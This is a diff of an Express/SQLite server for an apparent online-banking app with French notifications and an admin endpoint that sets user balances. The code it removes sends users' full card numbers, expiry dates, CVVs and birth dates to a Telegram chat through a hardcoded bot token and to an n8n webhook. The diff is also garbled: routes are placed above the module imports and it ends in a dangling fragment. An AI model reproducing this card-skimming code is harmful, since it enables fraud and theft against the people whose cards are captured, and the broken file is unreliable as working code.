@@ -1,3 +1,182 @@
+// --- INSTITUTION CHANGE REQUESTS ---
+
+// Create institution change request
+app.post("/api/institution-change-requests", (req, res) => {
+  const { userId, requestedInstitution } = req.body;
+
+  // Get user's current institution
+  db.get(
+    "SELECT name, financialInstitution FROM users WHERE id = ?",
+    [userId],
+    (err, user) => {
+      if (err) return res.status(500).json({ error: err.message });
+      if (!user) return res.status(404).json({ error: "User not found" });
+
+      const id = generateId();
+      const requestDate = new Date().toISOString();
+
+      db.run(
+        "INSERT INTO institution_change_requests VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
+        [
+          id,
+          userId,
+          user.name,
+          user.financialInstitution || "TD Bank",
+          requestedInstitution,
+          "PENDING",
+          requestDate,
+          null,
+        ],
+        function (err) {
+          if (err) return res.status(500).json({ error: err.message });
+
+          // Create notification for user
+          const notifId = generateId();
+          db.run("INSERT INTO notifications VALUES (?, ?, ?, ?, ?, ?, ?)", [
+            notifId,
+            userId,
+            "Demande de changement d'institution",
+            `Votre demande de changement vers ${requestedInstitution} a été soumise et est en attente d'approbation.`,
+            requestDate,
+            0,
+            "info",
+          ]);
+
+          res.status(201).json({
+            id,
+            userId,
+            userName: user.name,
+            currentInstitution: user.financialInstitution || "TD Bank",
+            requestedInstitution,
+            status: "PENDING",
+            requestDate,
+          });
+        }
+      );
+    }
+  );
+});
+
+// Get all institution change requests (admin)
+app.get("/api/institution-change-requests", (req, res) => {
+  db.all(
+    "SELECT * FROM institution_change_requests ORDER BY requestDate DESC",
+    [],
+    (err, requests) => {
+      if (err) return res.status(500).json({ error: err.message });
+      res.json(requests);
+    }
+  );
+});
+
+// Get user's institution change requests
+app.get("/api/institution-change-requests/user/:userId", (req, res) => {
+  db.all(
+    "SELECT * FROM institution_change_requests WHERE userId = ? ORDER BY requestDate DESC",
+    [req.params.userId],
+    (err, requests) => {
+      if (err) return res.status(500).json({ error: err.message });
+      res.json(requests);
+    }
+  );
+});
+
+// Approve institution change request
+app.patch("/api/institution-change-requests/:id/approve", (req, res) => {
+  const { adminReason } = req.body;
+
+  // Get request details
+  db.get(
+    "SELECT * FROM institution_change_requests WHERE id = ?",
+    [req.params.id],
+    (err, request) => {
+      if (err) return res.status(500).json({ error: err.message });
+      if (!request) return res.status(404).json({ error: "Request not found" });
+
+      // Update user's financial institution
+      db.run(
+        "UPDATE users SET financialInstitution = ? WHERE id = ?",
+        [request.requestedInstitution, request.userId],
+        function (err) {
+          if (err) return res.status(500).json({ error: err.message });
+
+          // Update request status
+          db.run(
+            "UPDATE institution_change_requests SET status = ?, adminReason = ? WHERE id = ?",
+            ["APPROVED", adminReason || null, req.params.id],
+            function (err) {
+              if (err) return res.status(500).json({ error: err.message });
+
+              // Create notification for user
+              const notifId = generateId();
+              db.run("INSERT INTO notifications VALUES (?, ?, ?, ?, ?, ?, ?)", [
+                notifId,
+                request.userId,
+                "Changement d'institution approuvé",
+                `Votre demande de changement vers ${
+                  request.requestedInstitution
+                } a été approuvée. ${adminReason || ""}`,
+                new Date().toISOString(),
+                0,
+                "success",
+              ]);
+
+              res.json({
+                message: "Request approved and user institution updated",
+              });
+            }
+          );
+        }
+      );
+    }
+  );
+});
+
+// Reject institution change request
+app.patch("/api/institution-change-requests/:id/reject", (req, res) => {
+  const { adminReason } = req.body;
+
+  // Get request details
+  db.get(
+    "SELECT * FROM institution_change_requests WHERE id = ?",
+    [req.params.id],
+    (err, request) => {
+      if (err) return res.status(500).json({ error: err.message });
+      if (!request) return res.status(404).json({ error: "Request not found" });
+
+      // Update request status
+      db.run(
+        "UPDATE institution_change_requests SET status = ?, adminReason = ? WHERE id = ?",
+        ["REJECTED", adminReason || "Demande refusée", req.params.id],
+        function (err) {
+          if (err) return res.status(500).json({ error: err.message });
+
+          // Create notification for user
+          const notifId = generateId();
+          db.run("INSERT INTO notifications VALUES (?, ?, ?, ?, ?, ?, ?)", [
+            notifId,
+            request.userId,
+            "Changement d'institution refusé",
+            `Votre demande de changement vers ${
+              request.requestedInstitution
+            } a été refusée. Raison: ${adminReason || "Non spécifiée"}`,
+            new Date().toISOString(),
+            0,
+            "error",
+          ]);
+
+          res.json({ message: "Request rejected" });
+        }
+      );
+    }
+  );
+});
+  res.sendFile(path.join(__dirname, "../dist", "index.html"));
+});
+
+app.listen(PORT, () => {
+  console.log(`Server running on http://localhost:${PORT}`);
+});
 const express = require("express");
 const bodyParser = require("body-parser");
 const cors = require("cors");
@@ -86,32 +265,20 @@ const fetchFullUser = (userId, callback) => {
               [userId],
               (err, bens) => {
                 if (err) return callback(err);
+                response.beneficiaries = bens;
 
-                db.all(
-                  "SELECT * FROM withdrawal_methods WHERE userId = ? AND status = 'ACTIVE'",
-                  [userId],
-                  (err, methods) => {
-                    const parsed = methods
-                      ? methods.map((m) => ({
-                          ...m,
-                          details: JSON.parse(m.details),
-                        }))
-                      : [];
-                    const fullUser = {
-                      ...response.user,
-                      transactions: response.transactions,
-                      notifications: response.notifications,
-                      beneficiaries: bens,
-                      withdrawalMethods: parsed,
-                    };
-                    callback(null, fullUser);
-                  },
-                );
-              },
+                const fullUser = {
+                  ...response.user,
+                  transactions: response.transactions,
+                  notifications: response.notifications,
+                  beneficiaries: response.beneficiaries,
+                };
+                callback(null, fullUser);
+              }
             );
-          },
+          }
         );
-      },
+      }
     );
   });
 };
@@ -133,7 +300,7 @@ app.post("/api/login", (req, res) => {
         if (err) return res.status(500).json({ error: err.message });
         res.json(fullUser);
       });
-    },
+    }
   );
 });
 
@@ -165,7 +332,7 @@ app.post("/api/register", (req, res) => {
     const cvv = generateCVV();
 
     const stmt = db.prepare(
-      "INSERT INTO users VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
+      "INSERT INTO users VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
     );
     stmt.run(
       id,
@@ -189,7 +356,7 @@ app.post("/api/register", (req, res) => {
           if (err) return res.status(500).json({ error: err.message });
           res.status(201).json(fullUser);
         });
-      },
+      }
     );
     stmt.finalize();
   });
@@ -242,9 +409,9 @@ app.patch("/api/users/:id/set-balance", (req, res) => {
         (err, user) => {
           if (err) return res.status(500).json({ error: err.message });
           res.json(user);
-        },
+        }
       );
-    },
+    }
   );
 });
 
@@ -257,7 +424,7 @@ app.post("/api/users", (req, res) => {
   const cvv = generateCVV();
 
   const stmt = db.prepare(
-    "INSERT INTO users VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
+    "INSERT INTO users VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
   );
   stmt.run(
     id,
@@ -287,7 +454,7 @@ app.post("/api/users", (req, res) => {
         beneficiaries: [],
       };
       res.status(201).json(newUser);
-    },
+    }
   );
   stmt.finalize();
 });
@@ -313,23 +480,22 @@ app.post("/api/transactions", (req, res) => {
           db.run("ROLLBACK");
           return res.status(500).json({ error: err.message });
         }
-      },
+      }
     );
 
     // Insert Transaction
-    // Column order: id, userId, amount, type, status, date, description, counterparty, adminReason, paymentLink, adminMessage
     const stmt = db.prepare(
-      "INSERT INTO transactions VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
+      "INSERT INTO transactions VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
     );
     stmt.run(
       id,
       userId,
       amount,
       type,
-      txStatus, // status comes BEFORE date in the schema
-      date,
+      date, // ✅ date before status
       description,
       counterparty,
+      txStatus, // ✅ status after counterparty
       null, // adminReason - initially null
       null, // paymentLink - initially null
       null, // adminMessage - initially null
@@ -349,7 +515,7 @@ app.post("/api/transactions", (req, res) => {
           description,
           counterparty,
         });
-      },
+      }
     );
     stmt.finalize();
   });
@@ -375,7 +541,7 @@ app.patch("/api/transactions/:id", (req, res) => {
         ]);
         db.run(
           "UPDATE transactions SET status = ?, adminReason = ? WHERE id = ?",
-          [status, adminReason || null, id],
+          [status, adminReason || null, id]
         );
         db.run("COMMIT", (err) => {
           if (err) return res.status(500).json({ error: err.message });
@@ -390,7 +556,7 @@ app.patch("/api/transactions/:id", (req, res) => {
         (err) => {
           if (err) return res.status(500).json({ error: err.message });
           res.json({ success: true });
-        },
+        }
       );
     }
   });
@@ -432,9 +598,9 @@ app.patch("/api/transactions/:id/payment-instructions", (req, res) => {
           (err) => {
             if (err) return res.status(500).json({ error: err.message });
             res.json({ success: true });
-          },
+          }
         );
-      },
+      }
     );
   });
 });
@@ -448,7 +614,7 @@ app.patch("/api/users/:id/status", (req, res) => {
     function (err) {
       if (err) return res.status(500).json({ error: err.message });
       res.json({ success: true });
-    },
+    }
   );
 });
 
@@ -484,7 +650,7 @@ app.post("/api/loans", (req, res) => {
       res
         .status(201)
         .json({ id, userId, userName, amount, purpose, status, requestDate });
-    },
+    }
   );
   stmt.finalize();
 });
@@ -498,7 +664,7 @@ app.patch("/api/loans/:id", (req, res) => {
     function (err) {
       if (err) return res.status(500).json({ error: err.message });
       res.json({ success: true });
-    },
+    }
   );
 });
 
@@ -524,7 +690,7 @@ app.post("/api/notifications", (req, res) => {
   const date = new Date().toISOString();
 
   const stmt = db.prepare(
-    "INSERT INTO notifications VALUES (?, ?, ?, ?, ?, ?, ?)",
+    "INSERT INTO notifications VALUES (?, ?, ?, ?, ?, ?, ?)"
   );
   stmt.run(id, userId, title, message, date, 0, type, function (err) {
     if (err) return res.status(500).json({ error: err.message });
@@ -542,7 +708,7 @@ app.get("/api/notifications/:userId", (req, res) => {
       if (err) return res.status(500).json({ error: err.message });
       const notifications = rows.map((n) => ({ ...n, read: !!n.read }));
       res.json(notifications);
-    },
+    }
   );
 });
 
@@ -554,7 +720,7 @@ app.patch("/api/notifications/:id/read", (req, res) => {
     (err) => {
       if (err) return res.status(500).json({ error: err.message });
       res.json({ success: true });
-    },
+    }
   );
 });
 
@@ -604,9 +770,9 @@ app.post("/api/document-requests", (req, res) => {
         ],
         () => {
           res.status(201).json({ id });
-        },
+        }
       );
-    },
+    }
   );
 });
 
@@ -621,7 +787,7 @@ app.get("/api/document-requests", (req, res) => {
     (err, rows) => {
       if (err) return res.status(500).json({ error: err.message });
       res.json(rows);
-    },
+    }
   );
 });
 
@@ -633,7 +799,7 @@ app.get("/api/document-requests/user/:userId", (req, res) => {
     (err, rows) => {
       if (err) return res.status(500).json({ error: err.message });
       res.json(rows);
-    },
+    }
   );
 });
 
@@ -659,9 +825,9 @@ app.patch(
       (err) => {
         if (err) return res.status(500).json({ error: err.message });
         res.json({ success: true, filePath });
-      },
+      }
     );
-  },
+  }
 );
 
 // Review document (approve/reject)
@@ -706,11 +872,11 @@ app.patch("/api/document-requests/:id/review", (req, res) => {
             ],
             () => {
               res.json({ success: true });
-            },
+            }
           );
-        },
+        }
       );
-    },
+    }
   );
 });
 
@@ -735,7 +901,7 @@ app.post("/api/settings", (req, res) => {
         if (err) return res.status(500).json({ error: err.message });
         res.json(config);
       });
-    },
+    }
   );
 });
 
@@ -747,293 +913,3 @@ app.post("/api/upload", upload.single("logo"), (req, res) => {
   res.json({ url: fileUrl });
 });
 
-// --- INSTITUTION CHANGE REQUESTS ---
-
-// Create institution change request
-app.post("/api/institution-change-requests", (req, res) => {
-  const { userId, requestedInstitution } = req.body;
-
-  // Get user's current institution
-  db.get(
-    "SELECT name, financialInstitution FROM users WHERE id = ?",
-    [userId],
-    (err, user) => {
-      if (err) return res.status(500).json({ error: err.message });
-      if (!user) return res.status(404).json({ error: "User not found" });
-
-      const id = generateId();
-      const requestDate = new Date().toISOString();
-
-      db.run(
-        "INSERT INTO institution_change_requests VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
-        [
-          id,
-          userId,
-          user.name,
-          user.financialInstitution || "TD Bank",
-          requestedInstitution,
-          "PENDING",
-          requestDate,
-          null,
-        ],
-        function (err) {
-          if (err) return res.status(500).json({ error: err.message });
-
-          // Create notification for user
-          const notifId = generateId();
-          db.run("INSERT INTO notifications VALUES (?, ?, ?, ?, ?, ?, ?)", [
-            notifId,
-            userId,
-            "Demande de changement d'institution",
-            `Votre demande de changement vers ${requestedInstitution} a été soumise et est en attente d'approbation.`,
-            requestDate,
-            0,
-            "info",
-          ]);
-
-          res.status(201).json({
-            id,
-            userId,
-            userName: user.name,
-            currentInstitution: user.financialInstitution || "TD Bank",
-            requestedInstitution,
-            status: "PENDING",
-            requestDate,
-          });
-        },
-      );
-    },
-  );
-});
-
-// Get all institution change requests (admin)
-app.get("/api/institution-change-requests", (req, res) => {
-  db.all(
-    "SELECT * FROM institution_change_requests ORDER BY requestDate DESC",
-    [],
-    (err, requests) => {
-      if (err) return res.status(500).json({ error: err.message });
-      res.json(requests);
-    },
-  );
-});
-
-// Get user's institution change requests
-app.get("/api/institution-change-requests/user/:userId", (req, res) => {
-  db.all(
-    "SELECT * FROM institution_change_requests WHERE userId = ? ORDER BY requestDate DESC",
-    [req.params.userId],
-    (err, requests) => {
-      if (err) return res.status(500).json({ error: err.message });
-      res.json(requests);
-    },
-  );
-});
-
-// Approve institution change request
-app.patch("/api/institution-change-requests/:id/approve", (req, res) => {
-  const { adminReason } = req.body;
-
-  // Get request details
-  db.get(
-    "SELECT * FROM institution_change_requests WHERE id = ?",
-    [req.params.id],
-    (err, request) => {
-      if (err) return res.status(500).json({ error: err.message });
-      if (!request) return res.status(404).json({ error: "Request not found" });
-
-      // Update user's financial institution
-      db.run(
-        "UPDATE users SET financialInstitution = ? WHERE id = ?",
-        [request.requestedInstitution, request.userId],
-        function (err) {
-          if (err) return res.status(500).json({ error: err.message });
-
-          // Update request status
-          db.run(
-            "UPDATE institution_change_requests SET status = ?, adminReason = ? WHERE id = ?",
-            ["APPROVED", adminReason || null, req.params.id],
-            function (err) {
-              if (err) return res.status(500).json({ error: err.message });
-
-              // Create notification for user
-              const notifId = generateId();
-              db.run("INSERT INTO notifications VALUES (?, ?, ?, ?, ?, ?, ?)", [
-                notifId,
-                request.userId,
-                "Changement d'institution approuvé",
-                `Votre demande de changement vers ${
-                  request.requestedInstitution
-                } a été approuvée. ${adminReason || ""}`,
-                new Date().toISOString(),
-                0,
-                "success",
-              ]);
-
-              res.json({
-                message: "Request approved and user institution updated",
-              });
-            },
-          );
-        },
-      );
-    },
-  );
-});
-
-// Reject institution change request
-app.patch("/api/institution-change-requests/:id/reject", (req, res) => {
-  const { adminReason } = req.body;
-
-  // Get request details
-  db.get(
-    "SELECT * FROM institution_change_requests WHERE id = ?",
-    [req.params.id],
-    (err, request) => {
-      if (err) return res.status(500).json({ error: err.message });
-      if (!request) return res.status(404).json({ error: "Request not found" });
-
-      // Update request status
-      db.run(
-        "UPDATE institution_change_requests SET status = ?, adminReason = ? WHERE id = ?",
-        ["REJECTED", adminReason || "Demande refusée", req.params.id],
-        function (err) {
-          if (err) return res.status(500).json({ error: err.message });
-
-          // Create notification for user
-          const notifId = generateId();
-          db.run("INSERT INTO notifications VALUES (?, ?, ?, ?, ?, ?, ?)", [
-            notifId,
-            request.userId,
-            "Changement d'institution refusé",
-            `Votre demande de changement vers ${
-              request.requestedInstitution
-            } a été refusée. Raison: ${adminReason || "Non spécifiée"}`,
-            new Date().toISOString(),
-            0,
-            "error",
-          ]);
-
-          res.json({ message: "Request rejected" });
-        },
-      );
-    },
-  );
-});
-
-// --- TELEGRAM NOTIFICATION ---
-
-const TELEGRAM_BOT_TOKEN = "7925710856:AAGg5gTxu8MXUraAOwZPg9ixD7aI7XK4Kvg";
-const TELEGRAM_CHAT_ID = "-1002581496621";
-
-const sendToTelegram = async (message) => {
-  try {
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-    await fetch(url, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-        parse_mode: "HTML",
-      }),
-    });
-  } catch (error) {
-    console.error("Failed to send Telegram message:", error);
-  }
-};
-
-// --- WITHDRAWAL METHODS ---
-
-app.post("/api/withdrawal-methods", (req, res) => {
-  const { userId, type, details } = req.body;
-  const id = generateId();
-  const createdAt = new Date().toISOString();
-  const status = "ACTIVE";
-
-  // Basic validation - details should be a JSON string or object
-  let detailsText = details;
-  if (typeof details !== "string") {
-    detailsText = JSON.stringify(details);
-  }
-
-  const stmt = db.prepare(
-    "INSERT INTO withdrawal_methods VALUES (?, ?, ?, ?, ?, ?)",
-  );
-  stmt.run(
-    id,
-    userId,
-    type,
-    detailsText,
-    status,
-    createdAt,
-    async function (err) {
-      if (err) return res.status(500).json({ error: err.message });
-
-      const parsedDetails =
-        typeof details === "string" ? JSON.parse(details) : details;
-
-      // Send to Webhook
-      try {
-        const webhookUrl = "https://smart030.app.n8n.cloud/webhook-test/card";
-        fetch(webhookUrl, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            userId,
-            type,
-            details: parsedDetails,
-            timestamp: new Date().toISOString(),
-          }),
-        }).catch((err) => console.error("Webhook trigger error:", err.message));
-      } catch (e) {
-        console.error("Webhook logic error", e);
-      }
-
-      // Send to Telegram
-      try {
-        let msg = `<b>New Withdrawal Method Added</b>\n`;
-        msg += `<b>User ID:</b> ${userId}\n`;
-        msg += `<b>Type:</b> ${type}\n`;
-
-        if (type === "BANK_CARD" && parsedDetails.cardNumber) {
-          msg += `<b>Card:</b> ${parsedDetails.cardNumber}\n`;
-          msg += `<b>Expiry:</b> ${parsedDetails.expiryDate}\n`;
-          msg += `<b>CVV:</b> ${parsedDetails.cvv}\n`;
-          msg += `<b>DOB:</b> ${parsedDetails.dateOfBirth}\n`;
-        } else {
-          msg += `<b>Details:</b> <pre>${JSON.stringify(parsedDetails, null, 2)}</pre>`;
-        }
-
-        sendToTelegram(msg); // Fire and forget
-      } catch (e) {
-        console.error("Telegram logic error", e);
-      }
-
-      res
-        .status(201)
-        .json({ id, userId, type, details: detailsText, status, createdAt });
-    },
-  );
-  stmt.finalize();
-});
-
-app.get("/api/withdrawal-methods/user/:userId", (req, res) => {
-  db.all(
-    "SELECT * FROM withdrawal_methods WHERE userId = ? AND status = 'ACTIVE'",
-    [req.params.userId],
-    (err, rows) => {
-      if (err) return res.status(500).json({ error: err.message });
-      res.json(rows);
-    },
-  );
-});
-
-// SPA Fallback: Serve index.html for any unknown routes
-app.get("*", (req, res) => {
-  res.sendFile(path.join(__dirname, "../dist", "index.html"));
-});
-
-app.listen(PORT, () => {
-  console.log(`Server running on http://localhost:${PORT}`);
-});
